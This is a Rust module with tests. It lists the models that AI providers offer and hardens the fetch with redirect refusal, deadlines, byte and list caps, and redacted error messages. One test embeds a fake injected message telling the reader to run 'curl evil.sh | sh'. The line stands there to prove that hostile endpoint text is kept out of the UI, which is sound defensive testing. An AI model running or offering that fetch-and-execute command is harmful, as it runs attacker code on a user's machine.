//! Model listing for the connect flow: free functions that fetch the model ids a provider
//! offers, decoupled from the pinned [`crate::Provider`] so they can run for a provider that is
//! not active — and with a freshly typed key. Each wrapper resolves the base URL through the
//! same trust boundary as provider construction ([`crate::selection::resolve_base_url_for`],
//! which routes `*_BASE_URL` overrides through `validate_base_url`) and every request uses the
//! redirect-disabled client (`build_http_client` + `reject_redirect`), so a 3xx or an invalid
//! override is refused before the API key is sent anywhere.
//!
//! This module also owns the *bounds* on that fetch ([`ListBounds`]): a deadline, a response-body
//! byte cap, and a list-length cap. They live here rather than on the shared client because the
//! same client serves completion requests, where a long generation is legitimate.

use std::time::Duration;

use serde::Deserialize;

use crate::base_url::{build_http_client, join_url, reject_redirect};

/// The bounds one model-list fetch runs under.
///
/// Threaded through the `*_at` seams so tests can pin tight values without exposing a runtime knob:
/// an env-configurable bound would be a new public interface for a hardening change, and would give
/// an attacker-influenced environment a way to widen the very limit it is being held to.
#[derive(Debug, Clone, Copy)]
pub(crate) struct ListBounds {
    /// Total deadline for one request: DNS + connect + TLS + time-to-first-byte + body read.
    ///
    /// Applied per-request (`RequestBuilder::timeout`) and **never** on the client. Do not "simplify"
    /// this onto `build_http_client`: the same client serves completion requests, where a long
    /// generation is legitimate, and a client-level deadline would cut them off. A per-request total
    /// deadline also subsumes a `connect_timeout`, which reqwest offers only at client level.
    pub(crate) timeout: Duration,
    /// Hard ceiling on buffered response bytes.
    pub(crate) max_body_bytes: usize,
    /// Hard ceiling on returned model ids. A longer list is **refused**, not truncated — see
    /// [`normalize`].
    pub(crate) max_models: usize,
}

/// The smallest body that can hold a well-formed empty list (`{"data":[]}` is 11 bytes). A cap
/// below this could never accept an honest response, so it is a bug in the caller, not a tight
/// bound.
const MIN_BODY_BYTES: usize = 16;

impl ListBounds {
    pub(crate) const DEFAULT: Self = Self {
        // The fetch backs an interactive modal that renders "Fetching models..." with no progress,
        // so a provider that has not answered in 15s has already failed the user. Real `/v1/models`
        // responses land in well under a second; this is long enough to absorb a cold TLS handshake
        // on a slow link and short enough that "Esc: cancel" is not the only way out.
        timeout: Duration::from_secs(15),
        // OpenAI's `/v1/models` is tens of kilobytes and Ollama's `/api/tags` is a few, so this is
        // roughly fifty times the largest plausible honest response — and a bound a terminal
        // process can absorb per in-flight fetch no matter what the endpoint sends.
        max_body_bytes: 2 * 1024 * 1024,
        // No provider publishes anywhere near this many models, and the modal is a scrolling list a
        // human reads.
        max_models: 1_000,
    };

    /// Reject bounds that cannot express a meaningful limit.
    ///
    /// Debug-only, on the `*_at` seams. A too-tight deadline or body cap fails loudly — the fetch
    /// errors — but `max_models: 0` used to make every fetch *succeed* with an empty list, the one
    /// bound whose violation produced a plausible-looking wrong answer instead of an error. These
    /// are `debug_assert`s rather than returned errors because the only constructors are
    /// `DEFAULT` and the test module: a violation is a programming mistake, not a runtime input.
    fn debug_check(self) {
        debug_assert!(
            !self.timeout.is_zero(),
            "a zero deadline cannot complete any request"
        );
        debug_assert!(
            self.max_models >= 1,
            "a list capped at zero ids can only ever yield an empty model list"
        );
        debug_assert!(
            self.max_body_bytes >= MIN_BODY_BYTES,
            "a body cap below {MIN_BODY_BYTES} bytes cannot admit even an empty list"
        );
    }
}

/// Read a response body, refusing to buffer more than `max_bytes`.
///
/// `Response::bytes()` / `Response::json()` buffer to completion, so a hostile endpoint's body
/// length becomes this process's allocation — and the Ollama path needs no credential at all, so
/// anything listening on `127.0.0.1:11434` could reach it. This reads frame by frame and bails the
/// moment the running total would exceed the cap, then drops the response, which closes the
/// connection rather than draining the rest of the body.
///
/// Peak buffering is `max_bytes` plus the frame that tripped the check, and that frame's size is
/// chosen by the HTTP layer (hyper's read buffer for h1, the negotiated max frame size for h2) —
/// not by the sender — so the bound is closed rather than one-frame-open. The buffer also starts
/// empty and is never reserved from a length the sender supplied.
///
/// A `Content-Length` pre-check is deliberately absent: the header is attacker-controlled, may be
/// missing on a chunked response, and would be a second rejection path that could drift from this
/// one while buying nothing it does not already give.
///
/// Nothing about the body reaches the error. The sender controls its content and this message is
/// rendered into a modal.
async fn read_capped(mut resp: reqwest::Response, max_bytes: usize) -> anyhow::Result<Vec<u8>> {
    let mut buf: Vec<u8> = Vec::new();
    while let Some(chunk) = resp.chunk().await? {
        if buf.len() + chunk.len() > max_bytes {
            anyhow::bail!(
                "model list response exceeded the {max_bytes}-byte cap; refusing to buffer it"
            );
        }
        buf.extend_from_slice(&chunk);
    }
    Ok(buf)
}

/// Build the GET for one model-list request: the redirect-disabled client for `base`, the joined
/// URL, and — the reason this function exists at all — the deadline.
///
/// The byte cap is structural because every response funnels through [`parse_capped`], but the
/// deadline used to be hand-repeated on four separate `RequestBuilder` chains, where a fifth
/// provider added later would simply omit it and nothing would fail. That is exactly the hazard
/// `base_url`'s module doc names: "every time one of them was defined in a single provider's file,
/// a sibling provider was left behind and the guarantee silently regressed." Every model-list
/// request is built here, so the deadline is structural rather than conventional; callers add only
/// their own auth headers.
fn model_list_request(base: &str, path: &str, bounds: ListBounds) -> reqwest::RequestBuilder {
    build_http_client(base)
        .get(join_url(base, path))
        // Per-request, never on the client: the same `build_http_client` serves completion
        // requests, where a long generation is legitimate.
        .timeout(bounds.timeout)
}

/// List model ids for a keyed provider against an already-resolved, already-validated `base_url`.
///
/// Deliberately does **not** re-validate `base_url`: the wrapper [`list_models`] is the trust
/// boundary and hands down a base that has already passed `validate_base_url`. Ids are
/// stable-sorted and deduped.
pub(crate) async fn list_models_at(
    provider: &str,
    base_url: &str,
    key: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    bounds.debug_check();
    match provider {
        "anthropic" => list_anthropic(base_url, key, bounds).await,
        "openai" => list_openai_compatible(base_url, "/v1/models", key, bounds).await,
        "gemini" => list_gemini(base_url, key, bounds).await,
        "deepseek" => list_openai_compatible(base_url, "/models", key, bounds).await,
        other => {
            anyhow::bail!("unknown provider '{other}'; expected anthropic|openai|gemini|deepseek")
        }
    }
}

/// Resolve `provider`'s base URL (env override → production default) and list its model ids.
pub async fn list_models(provider: &str, key: &str) -> anyhow::Result<Vec<String>> {
    let base = resolve_models_base(provider)?;
    list_models_at(provider, &base, key, ListBounds::DEFAULT).await
}

/// List model ids from the local Ollama server at `base_url`, extracting each `name` (including
/// any `:tag`) verbatim so a tagged model can be selected.
pub(crate) async fn list_ollama_models_at(
    base_url: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    bounds.debug_check();
    let raw = model_list_request(base_url, "/api/tags", bounds)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: OllamaTags = parse_capped(raw, bounds).await?;
    normalize(
        resp.models.into_iter().map(|m| m.name).collect(),
        bounds.max_models,
    )
}

/// List model ids from the local Ollama server at the default localhost root.
pub async fn list_ollama_models() -> anyhow::Result<Vec<String>> {
    list_ollama_models_at(crate::ollama::LOCAL_BASE, ListBounds::DEFAULT).await
}

/// Read the `*_BASE_URL` override for `provider` and resolve its base URL via the shared trust
/// boundary. This is the single place the env is read for model listing; the pure resolution
/// lives in [`crate::selection::resolve_base_url_for`].
fn resolve_models_base(provider: &str) -> anyhow::Result<String> {
    let override_value = crate::selection::RemoteChoice::parse(provider)
        .and_then(crate::selection::base_url_var)
        .and_then(std::env::var_os)
        .and_then(|raw| raw.into_string().ok())
        .filter(|v| !v.is_empty());
    crate::selection::resolve_base_url_for(provider, override_value)
}

async fn list_anthropic(base: &str, key: &str, bounds: ListBounds) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, "/v1/models", bounds)
        .header("x-api-key", key)
        .header("anthropic-version", crate::anthropic::ANTHROPIC_VERSION)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: IdList = parse_capped(raw, bounds).await?;
    normalize(
        resp.data.into_iter().map(|m| m.id).collect(),
        bounds.max_models,
    )
}

async fn list_openai_compatible(
    base: &str,
    path: &str,
    key: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, path, bounds)
        .header("authorization", format!("Bearer {key}"))
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: IdList = parse_capped(raw, bounds).await?;
    normalize(
        resp.data.into_iter().map(|m| m.id).collect(),
        bounds.max_models,
    )
}

async fn list_gemini(base: &str, key: &str, bounds: ListBounds) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, "/v1beta/models", bounds)
        .header("x-goog-api-key", key)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: GeminiModels = parse_capped(raw, bounds).await?;
    let ids = resp
        .models
        .into_iter()
        .map(|m| {
            m.name
                .strip_prefix("models/")
                .map(str::to_string)
                .unwrap_or(m.name)
        })
        .collect();
    normalize(ids, bounds.max_models)
}

/// Reject a 3xx-cleared, status-cleared response's body into `T` under the byte cap.
///
/// Ordering is load-bearing and unchanged from before the cap existed: `reject_redirect` has
/// already refused a 3xx, and `error_for_status` refuses a 4xx/5xx (discarding its body) before a
/// single byte of a success body is read.
async fn parse_capped<T: serde::de::DeserializeOwned>(
    raw: reqwest::Response,
    bounds: ListBounds,
) -> anyhow::Result<T> {
    let resp = raw.error_for_status()?;
    let body = read_capped(resp, bounds.max_body_bytes).await?;
    // Line and column only, and deliberately **not** `serde_json::Error`'s own Display: for an
    // `invalid_type` error that Display embeds the offending value verbatim — a body of
    // `{"data":"<attacker text>"}` renders as `invalid type: string "<attacker text>", expected a
    // sequence`. Since this message is interpolated into `connect.fetch_error` and drawn in the
    // modal, keeping it would let an endpoint place up to `max_body_bytes` of chosen text into the
    // TUI framed as this tool's own error — with no credential at all, because the Ollama path
    // targets 127.0.0.1:11434 and any local process squatting that port can drive it.
    serde_json::from_slice(&body).map_err(|e| {
        anyhow::anyhow!(
            "model list response was not valid JSON (line {}, column {})",
            e.line(),
            e.column()
        )
    })
}

/// Stable-sort, dedup, and bound a model-id list.
///
/// A list longer than `max` is **refused**, not truncated. Truncating would be a silent model
/// substitution: the models modal highlights the row matching the configured model and falls back
/// to row 0 when it is absent, so dropping the user's model off the tail would open the modal on a
/// different id, persist it on Enter, and report unqualified success — the user's model changed
/// without them asking and without being told. The retained subset is attacker-controlled on top
/// of that: an endpoint that wants a particular id at row 0 names it with an early-sorting prefix
/// and pads the list past `max`. By this cap's own premise a list this long comes only from a
/// hostile or broken endpoint, so refusing it is strictly more honest than serving an
/// attacker-chosen prefix, and it makes all three bounds reject rather than two-reject-one-degrade.
fn normalize(mut ids: Vec<String>, max: usize) -> anyhow::Result<Vec<String>> {
    ids.sort();
    ids.dedup();
    if ids.len() > max {
        // The count only. No id reaches an error the modal renders.
        anyhow::bail!(
            "model list reported {} ids, exceeding the {max}-id cap; refusing it",
            ids.len()
        );
    }
    Ok(ids)
}

#[derive(Deserialize)]
struct IdItem {
    id: String,
}

#[derive(Deserialize)]
struct IdList {
    #[serde(default)]
    data: Vec<IdItem>,
}

#[derive(Deserialize)]
struct GeminiModel {
    name: String,
}

#[derive(Deserialize)]
struct GeminiModels {
    #[serde(default)]
    models: Vec<GeminiModel>,
}

#[derive(Deserialize)]
struct OllamaModel {
    name: String,
}

#[derive(Deserialize)]
struct OllamaTags {
    #[serde(default)]
    models: Vec<OllamaModel>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use wiremock::matchers::{header, method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    #[tokio::test]
    async fn anthropic_lists_models_with_required_version_header() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .and(header("x-api-key", "test-key"))
            .and(header("anthropic-version", "2023-06-01"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "claude-sonnet-4" }, { "id": "claude-haiku-4-5" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("anthropic", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["claude-haiku-4-5", "claude-sonnet-4"]);
    }

    #[tokio::test]
    async fn openai_lists_models_with_bearer() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .and(header("authorization", "Bearer test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "gpt-4o" }, { "id": "gpt-4o-mini" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["gpt-4o", "gpt-4o-mini"]);
    }

    #[tokio::test]
    async fn gemini_lists_models_and_strips_the_models_prefix() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1beta/models"))
            .and(header("x-goog-api-key", "test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "models": [
                    { "name": "models/gemini-2.5-pro" },
                    { "name": "models/gemini-2.5-flash" }
                ]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("gemini", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["gemini-2.5-flash", "gemini-2.5-pro"]);
    }

    #[tokio::test]
    async fn deepseek_lists_models_on_the_models_path() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/models"))
            .and(header("authorization", "Bearer test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "deepseek-chat" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("deepseek", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["deepseek-chat"]);
    }

    #[tokio::test]
    async fn model_lists_are_deduped_and_stable_sorted() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "zebra" }, { "id": "alpha" }, { "id": "alpha" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["alpha", "zebra"]);
    }

    #[tokio::test]
    async fn ollama_lists_tags_extracting_names_with_tags() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/api/tags"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "models": [
                    { "name": "llama3.2:latest" },
                    { "name": "llama3.2" }
                ]
            })))
            .mount(&server)
            .await;

        let ids = list_ollama_models_at(&server.uri(), ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["llama3.2", "llama3.2:latest"]);
    }

    #[tokio::test]
    async fn an_auth_error_is_surfaced_as_an_error() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", ListBounds::DEFAULT)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("401") || err.to_string().contains("status"));
    }

    #[tokio::test]
    async fn a_redirect_is_rejected_and_the_key_is_not_forwarded() {
        let upstream = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(r#"{"data":[{"id":"leaked"}]}"#)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&upstream)
            .await;

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(302)
                    .insert_header("location", format!("{}/v1/models", upstream.uri()).as_str())
                    .insert_header("content-type", "application/json")
                    .set_body_string(r#"{"data":[{"id":"leaked"}]}"#),
            )
            .mount(&server)
            .await;

        let result = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT).await;
        assert!(
            result.is_err(),
            "a 3xx must be an error, not a parsed model list; got {result:?}"
        );
        assert!(
            upstream
                .received_requests()
                .await
                .expect("wiremock request recording must be enabled for this assertion")
                .is_empty(),
            "the redirect target must never receive the key"
        );
    }

    #[tokio::test]
    async fn an_unknown_provider_is_rejected_before_any_request() {
        assert!(
            list_models_at("local", "http://127.0.0.1:1", "k", ListBounds::DEFAULT)
                .await
                .is_err()
        );
    }

    /// Bounds tight enough for a test to reach in milliseconds, so every bound below is exercised
    /// deliberately rather than by accident of the production values.
    fn tight() -> ListBounds {
        ListBounds {
            timeout: Duration::from_secs(5),
            max_body_bytes: 64 * 1024,
            max_models: 1_000,
        }
    }

    #[tokio::test]
    async fn an_oversized_body_is_refused_instead_of_buffered() {
        let server = MockServer::start().await;
        // ~3.7 MiB against a 1 MiB cap. Both numbers are load-bearing: the cap must sit *above*
        // hyper's largest read frame (~400 KiB by default), not merely above its first one, or the
        // read bails on iteration one with an empty buffer and this test never exercises the
        // running total at all. It would then pass just as happily against a per-FRAME cap
        // (`chunk.len() > max_bytes`), which is functionally unbounded memory — an endpoint
        // streaming 8 KiB frames forever buffers without limit. A measured frame sequence for a
        // body this size was 8081, 16384, 32768, 24697, ..., so a cap of, say, 20_000 would still
        // be tripped by a single later frame and would not bind the cumulative bound either.
        let ids: Vec<_> = (0..150_000)
            .map(|i| serde_json::json!({ "id": format!("model-{i:06}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: 1_048_576,
                ..tight()
            },
        )
        .await
        .unwrap_err();

        // `{:#}` walks the whole anyhow chain; `to_string()` would show only the outermost message
        // and could hide a leak added downstream.
        let chain = format!("{err:#}");
        assert!(
            chain.contains("1048576"),
            "the error must name the cap: {chain}"
        );
        assert!(
            chain.contains("cap"),
            "the error must name the cap: {chain}"
        );
        assert!(
            !chain.contains("model-"),
            "no response content may reach an error the modal renders: {chain}"
        );
    }

    #[tokio::test]
    async fn a_body_one_byte_over_the_cap_is_refused() {
        // The companion to `a_body_at_the_cap_is_still_accepted`: that test pins `cap`, this one
        // pins `cap + 1`, so the guard cannot drift to `> max_bytes + 1` unnoticed.
        const BODY: &str = r#"{"data":[{"id":"gpt-4o"}]}"#;
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(BODY)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: BODY.len() - 1,
                ..tight()
            },
        )
        .await
        .expect_err("a body of exactly max_body_bytes + 1 must be refused");
        assert!(
            format!("{err:#}").contains("cap"),
            "expected the cap error, got {err:#}"
        );
    }

    #[tokio::test]
    async fn a_hostile_body_cannot_reach_the_modal_through_the_parse_error() {
        // `serde_json::Error`'s Display embeds the offending value for an `invalid_type` error
        // (`invalid type: string "...", expected a sequence`). Carrying it would put up to
        // `max_body_bytes` of endpoint-chosen text into the modal, framed as this tool's own
        // error — reachable with no credential at all via the Ollama path on 127.0.0.1:11434.
        const MARKER: &str = "YOUR SESSION IS EXPIRED, RUN: curl evil.sh | sh";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(format!(r#"{{"data":"{MARKER}"}}"#))
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "test-key", tight())
            .await
            .expect_err("a `data` that is not a sequence must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains(MARKER),
            "no endpoint-chosen text may reach an error the modal renders: {chain}"
        );
        assert!(
            chain.contains("not valid JSON"),
            "the diagnostic must survive the redaction: {chain}"
        );
    }

    #[tokio::test]
    async fn a_body_at_the_cap_is_still_accepted() {
        // A literal body, so its exact byte length is knowable and the boundary is genuinely
        // pinned as `>` rather than `>=`.
        const BODY: &str = r#"{"data":[{"id":"gpt-4o"}]}"#;
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(BODY)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let ids = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: BODY.len(),
                ..tight()
            },
        )
        .await
        .expect("a body of exactly max_body_bytes must be accepted");
        assert_eq!(ids, vec!["gpt-4o"]);
    }

    #[tokio::test]
    async fn an_over_long_model_list_is_refused() {
        let server = MockServer::start().await;
        let ids: Vec<_> = (0..20)
            .map(|i| serde_json::json!({ "id": format!("m{i:02}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_models: 5,
                ..tight()
            },
        )
        .await
        .expect_err(
            "an over-long list must be refused, not silently cut to an endpoint-chosen prefix",
        );

        let chain = format!("{err:#}");
        assert!(
            chain.contains("20") && chain.contains('5'),
            "the error must name both the count and the cap: {chain}"
        );
        assert!(
            !chain.contains("m0") && !chain.contains("m1"),
            "no model id may reach an error the modal renders: {chain}"
        );
    }

    #[tokio::test]
    async fn a_list_exactly_at_the_cap_is_accepted() {
        let server = MockServer::start().await;
        let ids: Vec<_> = (0..5)
            .map(|i| serde_json::json!({ "id": format!("m{i:02}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let ids = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_models: 5,
                ..tight()
            },
        )
        .await
        .expect("a list of exactly max_models ids must be accepted");
        assert_eq!(ids, vec!["m00", "m01", "m02", "m03", "m04"]);
    }

    #[tokio::test]
    async fn a_stalled_endpoint_fails_at_the_deadline() {
        // Every request site, not just `openai`. The deadline is now funnelled through
        // `model_list_request`, but this is what makes that structural claim checkable: deleting
        // `.timeout(...)` for any single provider must fail here. Ollama matters most — it needs
        // no credential, so anything on 127.0.0.1:11434 reaches it.
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_delay(Duration::from_secs(5)))
            .mount(&server)
            .await;

        let bounds = ListBounds {
            timeout: Duration::from_millis(150),
            ..tight()
        };

        // Identified structurally, never by message text, and with no assertion on elapsed
        // wall-clock time (which would be flaky under load).
        fn assert_timeout(label: &str, err: &anyhow::Error) {
            assert!(
                err.downcast_ref::<reqwest::Error>()
                    .is_some_and(reqwest::Error::is_timeout),
                "{label}: expected a reqwest timeout, got {err:#}"
            );
        }

        for provider in ["anthropic", "openai", "gemini", "deepseek"] {
            let err = list_models_at(provider, &server.uri(), "test-key", bounds)
                .await
                .unwrap_err();
            assert_timeout(provider, &err);
        }

        let err = list_ollama_models_at(&server.uri(), bounds)
            .await
            .unwrap_err();
        assert_timeout("ollama", &err);
    }

    #[test]
    fn default_bounds_are_the_production_values() {
        // Pinned so a later accidental widening is a failing test rather than a silent regression.
        assert_eq!(ListBounds::DEFAULT.timeout, Duration::from_secs(15));
        assert_eq!(ListBounds::DEFAULT.max_body_bytes, 2 * 1024 * 1024);
        assert_eq!(ListBounds::DEFAULT.max_models, 1_000);
    }
}
